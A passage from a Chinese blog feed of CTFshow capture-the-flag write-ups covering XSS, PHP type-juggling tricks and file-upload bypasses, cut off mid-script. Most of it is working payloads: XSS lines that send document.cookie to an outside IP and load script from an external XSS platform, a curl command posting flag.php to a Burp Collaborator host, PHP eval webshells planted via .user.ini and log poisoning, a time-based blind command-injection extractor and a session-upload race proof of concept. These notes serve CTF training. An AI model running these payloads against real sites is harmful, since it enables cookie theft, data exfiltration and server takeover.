class="language-none">&lt;iframeWIDTH&#x3D;0HEIGHT&#x3D;0srcdoc&#x3D;。。。。。。。。。。&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#48;&amp;#120;&amp;#46;&amp;#97;&amp;#120;&amp;#47;&amp;#107;&amp;#48;&amp;#74;&amp;#106;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>321</strong></p><p>过滤了img，同上</p><p><strong>322</strong></p><p>同上</p><p><strong>323</strong></p><p>过滤了iframe，使用body onload（艹居然过滤了xss，我的域名里有xss啊啊啊啊啊啊啊啊啊啊啊）</p><pre class="line-numbers language-none"><code class="language-none">&lt;body&#x2F;onload&#x3D;document.location&#x3D;&#39;http:&#x2F;&#x2F;20.231.29.154:5000&#x2F;?cookie&#x3D;&#39;+document.cookie;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一直到326通杀</p><p>浅总结：看这几道题来说，反射性xss无非就是变换标签，结合各种编码去绕过，空格用<code>\</code>，关键字双写或者编码等等</p><p>存储型XSS开始</p><p><strong>327</strong></p><p>收件人为admin，内容为XSS即可</p><pre class="line-numbers language-none"><code class="language-none">&lt;body&#x2F;onload&#x3D;document.location&#x3D;&#39;http:&#x2F;&#x2F;20.231.29.154:5000&#x2F;?cookie&#x3D;&#39;+document.cookie;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>328</strong></p><p>构造js偷管理员cookie（不知道为啥我偷了登陆了也不行）</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-20" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 17.41.19.png)</p><p>用超强模块吧</p><pre class="line-numbers language-none"><code class="language-none">&lt;sCRiPt sRC&#x3D;&#x2F;&#x2F;xss8.cc&#x2F;R9YM&gt;&lt;&#x2F;sCrIpT&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowPHP特性</title>
      <link href="/posts/47427.html"/>
      <url>/posts/47427.html</url>
      
        <content type="html"><![CDATA[<p><strong>89</strong></p><p>数组绕过</p><pre class="line-numbers language-none"><code class="language-none">intval()用于获取变量的整数值intval() 函数通过使用指定的进制base转换（默认是十进制），返回变量var的integer数值。intval()不能用于object，否则会产生E_NOTICE错误并返回1。语法int intval ( mixed $var [, int $base &#x3D; 10 ] )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>90</strong></p><p>十六进制</p><p><strong>91</strong></p><pre class="line-numbers language-none"><code class="language-none">if(preg_match(&#39;&#x2F;^php$&#x2F;im&#39;, $a))&#123;    if(preg_match(&#39;&#x2F;^php$&#x2F;i&#39;, $a))&#123;        echo &#39;hacker&#39;;    &#125;&#x2F;&#x2F;m代表多行匹配，换行符加php即可&#x2F;&#x2F;cmd&#x3D;%0Aphp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>92</strong></p><p>同90</p><p><strong>93</strong></p><p>滤了16进制，使用8进制绕过</p><pre class="line-numbers language-none"><code class="language-none">?num&#x3D;010574<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>94</strong></p><p>全等用小数绕过</p><pre class="line-numbers language-none"><code class="language-none">?num&#x3D;4476.01<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>95</strong></p><p>小数点没了，用八进制加正号绕过0过滤</p><pre class="line-numbers language-none"><code class="language-none">?num&#x3D;+010574<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>96</strong></p><pre class="line-numbers language-none"><code class="language-none">?u&#x3D;.&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>97</strong></p><p>md5强相等数组绕过</p><pre class="line-numbers language-none"><code class="language-none">a[]&#x3D;1&amp;b[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>98</strong></p><p>分析代码</p><pre class="line-numbers language-none"><code class="language-none">3.$_GET?$_GET&#x3D;&amp;$_POST:&#39;flag&#39;;    if ($_GET) &#123;&#x2F;&#x2F;只要有输入的get参数        $_GET &#x3D; &amp;$_POST; &#x2F;&#x2F;就将get方法改变为post方法(修改了get方法的地址)        &#x2F;&#x2F; 比如$_GET[a] &#x3D; &amp;$_POST[a]，get传a无作用，必须用POST    &#125; else &#123;        &quot;flag&quot;;    &#125;4、5行无作用6.highlight_file($_GET[&#39;HTTP_FLAG&#39;]&#x3D;&#x3D;&#39;flag&#39;?$flag:__FILE__);    if ($_GET[&#39;HTTP_FLAG&#39;] &#x3D;&#x3D; &#39;flag&#39;) &#123; &#x2F;&#x2F;需要满足这个条件就可以输出flag        highlight_file($flag);&#x2F;&#x2F;因为没有ctfshow&#123;xxxxx&#125;这个文件，所以会产生报错        &#x2F;&#x2F;进而我们可以看到flag内容    &#125; else &#123;        highlight_file(__FILE__);    &#125;构造POSTHTTP_FLAG&#x3D;flag再添加任意get参数即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>99</strong></p><pre class="line-numbers language-none"><code class="language-none">in_array函数如果不设置strict参数为真则进行若比较，1.php&#x3D;&#x3D;1payload：n&#x3D;1.phpPOSTcontent&#x3D;一句话木马<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>100</strong></p><p>在PHP中，=赋值运算符优先级高于and，所以语句执行是v0=is_numeric(v1)，传入v1为数字即可</p><pre class="line-numbers language-none"><code class="language-none">?v1&#x3D;1&amp;v2&#x3D;var_dump($ctfshow)&amp;v3&#x3D;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>101</strong></p><p>反射类</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">顾名思义，就是一个类的反射（废话么不是）下面是例子<span class="token keyword">class</span> <span class="token class-name-definition class-name">fuc</span> <span class="token punctuation">&#123;</span> <span class="token comment">//定义一个类</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">ec</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'我是一个类'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fuc'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//建立 fuc这个类的反射类</span><span class="token variable">$fuc</span><span class="token operator">=</span><span class="token variable">$class</span><span class="token operator">-></span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//相当于实例化 fuc 类</span><span class="token variable">$fuc</span><span class="token operator">-></span><span class="token function">ec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//执行 fuc 里的方法ec</span><span class="token variable">$ec</span><span class="token operator">=</span><span class="token variable">$class</span><span class="token operator">-></span><span class="token function">getmethod</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ec'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//获取fuc 类中的ec方法</span><span class="token variable">$fuc</span><span class="token operator">=</span><span class="token variable">$class</span><span class="token operator">-></span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//实例化</span><span class="token variable">$ec</span><span class="token operator">-></span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token variable">$fuc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//执行ec 方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Payload</p><pre class="line-numbers language-none"><code class="language-none">?v1&#x3D;1&amp;v2&#x3D;echo new Reflectionclass&amp;v3&#x3D;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>102</strong></p><pre class="line-numbers language-none"><code class="language-none">先转base64再转16进制完成绕过<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>103</strong></p><p>同上</p><p><strong>104</strong></p><p>没验证直接传俩一样的呗</p><p><strong>105</strong></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">foreach($_GET as $key &#x3D;&gt; $value)&#123;    if($key&#x3D;&#x3D;&#x3D;&#39;error&#39;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key&#x3D;$$value;&#125;foreach($_POST as $key &#x3D;&gt; $value)&#123;    if($value&#x3D;&#x3D;&#x3D;&#39;flag&#39;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key&#x3D;$$value;&#125;多种操作方法通过die($error)输出payload:a&#x3D;flag POST: error&#x3D;a进行的操作为$a&#x3D;$flag;$error&#x3D;$a;此时$a&#x3D;flag&#123;test123&#125;;$error&#x3D;flag&#123;test123&#125;;从而输出error也就是输出flag通过die($suces)payload:suces&#x3D;flag&amp;flag&#x3D;进行的操作为$suces&#x3D;$flag;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>106</strong></p><p>构造数组或弱相等绕过</p><pre class="line-numbers language-none"><code class="language-none">aaroZmOkaaK1STfYaaO8zKZFaa3OFF9m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>107</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">parse_str函数，将字符串解析成多个变量<span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"x=1&amp;y=2"</span><span class="token punctuation">;</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>此时<span class="token variable">$b</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span>为<span class="token number">1</span>，<span class="token variable">$b</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'y'</span><span class="token punctuation">]</span>为<span class="token number">2</span>paylaod<span class="token punctuation">:</span><span class="token operator">?</span>v3<span class="token operator">=</span><span class="token number">1</span><span class="token constant">POST</span>v1<span class="token operator">=</span>flag<span class="token operator">=</span>c4ca4238a0b923820dcc509a6f75849b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>108</strong></p><p>正则表达式%00截断，正则表达式只会匹配%00之前的内容</p><pre class="line-numbers language-none"><code class="language-none">strrev()&#x2F;&#x2F;反转字符串intval()&#x2F;&#x2F;取整数payload:?c&#x3D;a%00778<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>109</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//构造使得v1名称的类存在后面任意构造即可</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>110</strong></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">FilesystemIterator类的使用$a&#x3D;new FilesystemIterator(getcwd());while($a-&gt;valid())&#123;  echo $a-&gt;getFilename().&quot;\n&quot;;  $a-&gt;next();&#125;迭代输出当前目录下的内容getcwd()&#x2F;&#x2F;取得当前工作目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>111</strong></p><p>v1要在正则中等于ctfshow，执行的语句就是</p><pre class="line-numbers language-none"><code class="language-none">$ctfshow&#x3D;&amp;$(v2的值);var_dump($ctfshow);相当于执行了var_dump($(v2的值));令v2&#x3D;GLOBALS超全局变量即可将所有变量打印payload:?v1&#x3D;ctfshow&amp;v2&#x3D;GLOBALS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>112</strong></p><pre class="line-numbers language-none"><code class="language-none">URL二次编码，题目中把base64滤过了，对b进行二次URL编码即可，传入php时进行一次解码，调用php伪协议时再有一次<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>113</strong></p><p>压缩流读取</p><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;compress.zlib:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>114</strong></p><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>115</strong></p><p>在数字前加上空格，也会被is_numeric函数认为是数字</p><p>trim函数会过滤空格以及<code>\n\r\t\v\0</code>，但不会过滤<code>\f</code></p><p>最终payload:urlencode(“\f”.36)</p><p><strong>123</strong></p><pre class="line-numbers language-none"><code class="language-none">PHP变量名应该只有数字字母下划线,同时GET或POST方式传进去的变量名,会自动将空格，+，.，[转换为_，但是当有特殊字符[时，后面的内容中就不会替换了payload:POST:CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;echo $flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>125</strong></p><pre class="line-numbers language-none"><code class="language-none">CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;var_export(get_defined_vars())CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;highlight_file($_GET[1])?1&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>126</strong></p><pre class="line-numbers language-none"><code class="language-none">1、cli模式（命令行）下第一个参数$_SERVER[&#39;argv&#39;][0]是脚本名，其余的是传递给脚本的参数2、web网页模式下在web页模式下必须在php.ini开启register_argc_argv配置项设置register_argc_argv &#x3D; On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果这时候的$_SERVER[‘argv’][0] &#x3D; $_SERVER[‘QUERY_STRING’]&#x2F;&#x2F;这里的这个参数就是GET请求中?后的内容$argv,$argc在web模式下不适用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">payload:?$fl0g&#x3D;flag_give_me;CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;eval($a[0])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>127</strong></p><p>前面的自动转换咯</p><p><strong>128</strong></p><pre class="line-numbers language-none"><code class="language-none">小知识点： _()是一个函数_()&#x3D;&#x3D;gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dllget_defined_vars()函数get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flagpayload: ?f1&#x3D;_&amp;f2&#x3D;get_defined_vars<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>129</strong></p><p>目录穿越</p><pre class="line-numbers language-none"><code class="language-none">payload:?f&#x3D;&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>130</strong></p><p>正则/.+?ctfshow/is</p><p>stripos($f, ‘ctfshow’) === FALSE</p><p>stripos返回位置从0开始，未查找到才返回false，在严格相等中不相等</p><p>直接绕</p><p>f=ctfshow</p><p><strong>131</strong></p><p><span class="exturl"><a class="exturl__link"   href="https://www.laruence.com/2010/06/08/1579.html" >正则溢出</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>传个超过一百万长度的字符就好啦</p><pre class="line-numbers language-none"><code class="language-none">f&#x3D;&#39;kkkk&#39;*250000+&#39;36Dctfshow&#39;#python真好用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>132</strong></p><p>robots.txt进admin</p><p>对于“与”（&amp;&amp;） 运算： x &amp;&amp; y 当x为false时，直接跳过，不执行y；</p><p>对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y。</p><p>在判断这个的时候if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===”admin”) 第一个$code === mt_rand(1,0x36D)为false,之后就执行|| $username ===”admin”</p><p>后面有或，所以满足username===’admin’即可</p><pre class="line-numbers language-none"><code class="language-none">payload:&#x2F;admin&#x2F;?code&#x3D;admin&amp;password&#x3D;&amp;username&#x3D;admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>133</strong></p><p><span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/qq_46091464/article/details/109095382" >骚操作</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><pre class="line-numbers language-none"><code class="language-none">我们传递?F&#x3D;&#96;$F&#96;;+sleep 3好像网站确实sleep了一会说明的确执行了命令**那为什么会这样？**因为是我们传递的&#96;$F&#96;;+sleep 3。先进行substr()函数截断然后去执行eval()函数这个函数的作用是执行php代码，&#96;&#96;是shell_exec()函数的缩写，然后就去命令执行。而$F就是我们输入的&#96;$F&#96;;+sleep 3 使用最后执行的代码应该是&#96;$F&#96;;$F变量内容就是我们最终执行的内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用一把burp自带的功能，Burp Collaborator，相较于DNSLog的好处就是可以带出POST信息，也可以携带Cookie</p><p>还有curl命令的使用</p><pre class="line-numbers language-none"><code class="language-none">payload:?F&#x3D;&#96;$F&#96;;+curl -X POST -F xx&#x3D;@flag.php  http:&#x2F;&#x2F;whhi73p89wxl0oghis6zcslnue04ot.burpcollaborator.net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-09" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-09</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 15.18.07.png)</p><p><strong>134</strong></p><p>php变量覆盖 利用点是 extract($_POST); 进行解析$_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。</p><pre class="line-numbers language-none"><code class="language-none">payload: ?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>135</strong></p><p>同之前或者直接mv改名</p><pre class="line-numbers language-none"><code class="language-none">payload:?F&#x3D;&#96;$F&#96;;+mv flag.php flag.txt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>136</strong></p><p>ban了一堆命令，需要回显，使用Linux tee命令</p><p>Tee是Linux命令，用于显示程序的输出并将其复制到一个文件中。</p><pre class="line-numbers language-none"><code class="language-none">命令|tee 输出文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac &#x2F;f149_15_h3r3|tee 1查看&#x2F;1文件即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>137</strong></p><p>call_user_func()来调用一个类里面的方法时，使用::如class::function</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTctfshow&#x3D;ctfshow::getFlag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>138</strong></p><p>调用还能传数组</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTctfshow[]&#x3D;ctfshow&amp;ctfshow[]&#x3D;getFlag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>139</strong></p><p>自动跳转我谢谢你啊</p><p>我是真妹想到这玩意还能盲注</p><pre class="line-numbers language-none"><code class="language-none">import requestsimport timeimport stringstr&#x3D;string.digits+string.ascii_lowercase+&quot;-&quot;#获取小写字母与数字result&#x3D;&quot;&quot;key&#x3D;0for j in range(1,45):print(j)if key&#x3D;&#x3D;1:breakfor n in str:payload&#x3D;&quot;if [ &#96;cat &#x2F;f149_15_h3r3|cut -c &#123;0&#125;&#96; &#x3D;&#x3D; &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)#print(payload)url&#x3D;&quot;http:&#x2F;&#x2F;13f3a3cd-22e6-4922-a7eb-431f62263a4f.challenge.ctf.show&#x2F;?c&#x3D;&quot;+payloadtry:requests.get(url,timeout&#x3D;(2.5,2.5))#time()第一个参数是响应时间，第二个是读取时间except:    result&#x3D;result+n    print(result)    break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>140</strong></p><p>intval把字符串转成0，0==’字符串’结果为真</p><p>找俩函数返回值为字符串就行</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTf1&#x3D;md5&amp;f2&#x3D;phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>141</strong></p><p><span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/miuzzx/article/details/109143413" >绕过无字母数字方法</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>使用取反法</p><pre class="line-numbers language-none"><code class="language-none">payload：?v1&#x3D;1&amp;v3&#x3D;-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);-&amp;v2&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>142</strong></p><p>各种进制取零就行</p><p><strong>143</strong></p><p>过滤了取反字符，</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow文件上传</title>
      <link href="/posts/2824.html"/>
      <url>/posts/2824.html</url>
      
        <content type="html"><![CDATA[        <h1 id="文件上传"   >          <a href="#文件上传" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1>      <p><strong>151</strong></p><p>前端校验，直接绕过</p><p><strong>152</strong></p><p>Content/Type校验，直接绕过</p><p><strong>153</strong></p><p>文件后缀名校验，尝试使用php5,phtml等文件失败，康康wp学习新知识，查看响应 头发现中间件是nginx</p><pre class="line-numbers language-none"><code class="language-none">nginx中和apache的.htacess有相同作用的文件是.user.ini，进一步拓展，php中的默认配置文件实为php.ini，而php.ini有四种配置模式PHP_INI_USER可以在user.ini中设定PHP_INI_PERDIR可以在php.ini,.htacess,httpd.conf中设定PHP_INI_SYSTEM可以在php.ini,httpd.conf中设定PHP_INI_ALL随意设定并且除了php.ini文件之外，php还会从当前目录到web根目录下逐级搜索ini文件，并且在世纪操作中除了PHP_INI_SYSTEM中的内容都可以通过.user.ini进行设定那么user.ini中实际有用的配置项有两个：auto_append_file &#x2F;&#x2F;在php4.2.3及以前是PHP_INI_ALL里面的，后面变成了PHP_INI_PERDIDauto_prepend_file这两项的功能是制定一个文件包含在要执行的文件之后&#x2F;之前，类似帮助原始文件添加一个require(某文件)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以最终我们需要的就是将木马上传后再上传.user.ini设置包含木马即可</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;.user.iniauto_prepend_file &#x3D; shell.png&#x2F;&#x2F;shell.png@eval($_POST[&#39;kkk&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>154</strong></p><p>同上题，过滤了php，大小写绕过</p><p><strong>155</strong></p><p>严格过滤php，所以大小写过不去了，短标签绕过</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">当php参数:short_open_tag &#x3D; On时，php可以解析短标签内容php中常见的四种标签的写法：&lt;?php echo &quot;CTF&quot;; ?&gt;&lt;? echo &quot;CTF&quot;; ?&gt;&#x2F;&#x2F;short_open_tag &#x3D; On&lt;% echo &quot;CTF&quot;; %&gt;&#x2F;&#x2F;这种写法在php配置中默认关闭了的，所以不能输出一行3.如果要正常输出，需要配置php.ini文件。在配置文件中找到asp_tags&#x3D;off ,将off改为on。改动配置文件后需要重启apache。 &lt;script language&#x3D;&quot;php&quot;&gt; echo &quot;CTF&quot;; &lt;&#x2F;script&gt;还有一种神奇写法以后会用到&lt;?&#x3D;(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt; &#x2F;&#x2F;无限制  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>156</strong></p><p>过滤了<code>[  ]</code>，可用<code>&#123;  &#125;</code>代替</p><p><strong>157</strong></p><p>过滤了分号和花括号，用上面的神奇写法直接执行<code>&lt;?=(system(&#39;tac ../flag.???&#39;))?&gt;</code> </p><p><strong>158</strong></p><p>同上</p><p><strong>159</strong></p><p>system貌似没了，用<code>&lt;?=nl ``../fl*``?&gt;</code></p><p><strong>160</strong></p><p>反引号都没了，只能尝试包含访问日志了</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;shell.png&lt;?include&quot;&#x2F;var&#x2F;lo&quot;.&quot;g&#x2F;nginx&#x2F;access.lo&quot;.&quot;g&quot;?&gt;&#x2F;&#x2F;空格都没给留就离谱&#x2F;&#x2F;User-Agent&lt;?php eval($_POST[1]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>161</strong></p><p>增加了对文件头的检测，其余同上</p><p><strong>162</strong></p><p>.和flag被过滤，session文件的竞争包含，隔壁文件包含有原因</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&#x2F;&#x2F;.user.iniauto_prepend_file&#x3D;&#x2F;tmp&#x2F;sess_kkk&#x2F;&#x2F;1&lt;?&#x3D;include&quot;&#x2F;tmp&#x2F;sess_kkk&quot;?&gt;&#x2F;&#x2F;POC.html&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action&#x3D;&quot;链接&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingsession <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>sess <span class="token operator">=</span> <span class="token string">'j1an'</span>url1 <span class="token 